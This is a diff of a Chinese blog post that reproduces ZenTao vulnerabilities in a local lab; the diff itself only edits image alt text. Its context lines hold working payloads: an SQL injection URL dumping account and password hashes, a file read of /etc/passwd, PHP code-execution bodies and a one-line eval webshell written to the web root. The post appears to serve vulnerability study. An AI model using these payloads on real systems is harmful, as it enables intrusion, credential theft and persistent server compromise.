@@ -28,11 +28,11 @@ author: Chace
 
 解压安装后访问禅道主页 http://127.0.0.1/index.php
 
-![1](1.png)
+![](1.png)
 
 查看当前版本 http://127.0.0.1:81/zentao/index.php?mode=getconfig
 
-![2](2.png)
+![](2.png)
 
 至此环境搭建成功
 
@@ -49,7 +49,7 @@ http://127.0.0.1/zentao/api-getModel-api-sql-sql=select+account,password+from+zt
 
 Poc访问结果如下：
 
-![3](3.png)
+![](3.png)
 
 ### 漏洞2 文件读取
 
@@ -61,7 +61,7 @@ http://127.0.0.1/zentao/api-getModel-file-parseCSV-fileName=/etc/passwd
 
 Poc访问结果如下：
 
-![4](4.png)
+![](4.png)
 
 由于本地环境是window系统，所以没有回显，我们在xampp\zentao\module\api目录下新建一个test文件，读取
 
@@ -69,7 +69,7 @@ Poc访问结果如下：
 http://127.0.0.1/zentao/api-getModel-file-parseCSV-fileName=test
 ```
 
-![5](5.png)
+![](5.png)
 
 
 
@@ -95,7 +95,7 @@ Content-Length: 29
 fileContent=<?php phpinfo()?>
 ```
 
-![6](6.png)
+![](6.png)
 
 先写入一个phpinfo，再读取访问
 
@@ -105,7 +105,7 @@ fileContent=<?php phpinfo()?>
 http://127.0.0.1/zentao/api-getModel-api-getMethod-filePath=1111/1
 ```
 
-![7](7.png)
+![](7.png)
 
 > Payload2
 
@@ -113,9 +113,9 @@ http://127.0.0.1/zentao/api-getModel-api-getMethod-filePath=1111/1
 fileContent=<?php system('whoami');?>
 ```
 
-![8](8.png)
+![](8.png)
 
-![9](9.png)
+![](9.png)
 
 
 > Payload3(一句话)
@@ -123,7 +123,7 @@ fileContent=<?php system('whoami');?>
 fileContent=<?php file_put_contents('E://CMS/ZenTaoPMS/xampp/zentao/www/xxx.php.aaa', '<?php @eval($_REQUEST["x"]);?>');?>
 ```
 
-![10](10.png)
+![](10.png)
 
 这里是window系统，所以写入绝对路径，绝对路径可以同样用`fileContent=<?php getcwd()?>`获取
 
@@ -131,7 +131,7 @@ fileContent=<?php file_put_contents('E://CMS/ZenTaoPMS/xampp/zentao/www/xxx.php.
 http://127.0.0.1/zentao/xxx.php.aaa?x=phpinfo();
 ```
 
-![11](11.png)
+![](11.png)
 
 *PS:最好使用linux系统安装，windows不要使用一键安装包安装，windows系统安装集成版的话根目录下的php代码好像做了限制，无法执行。*
 
